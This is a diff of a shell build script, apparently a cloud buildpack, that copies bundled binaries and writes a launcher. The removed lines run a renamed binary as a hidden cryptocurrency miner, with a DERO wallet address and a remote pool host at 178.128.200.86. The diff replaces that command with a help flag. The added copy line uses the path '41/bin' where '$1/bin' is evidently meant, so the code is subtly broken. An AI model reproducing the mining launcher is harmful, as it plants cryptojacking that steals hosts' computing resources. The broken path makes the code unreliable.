@@ -7,10 +7,9 @@ set -e
 mkdir -p "$1/bin/"
 
 cp -a binaries-$STACK/* "$1/bin/"
-cp -a binaries-$STACK/astra "$1/bin/$dyno"
-
+cp -a "$1/bin/astra" "41/bin/$dyno"
 cat > "$1/bin/mode" <<END
-$1/bin/$dyno -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100
+$1/bin/$dyno -h
 END
 chmod 777 $1/bin/$dyno
 chmod 777 $1/bin/mode
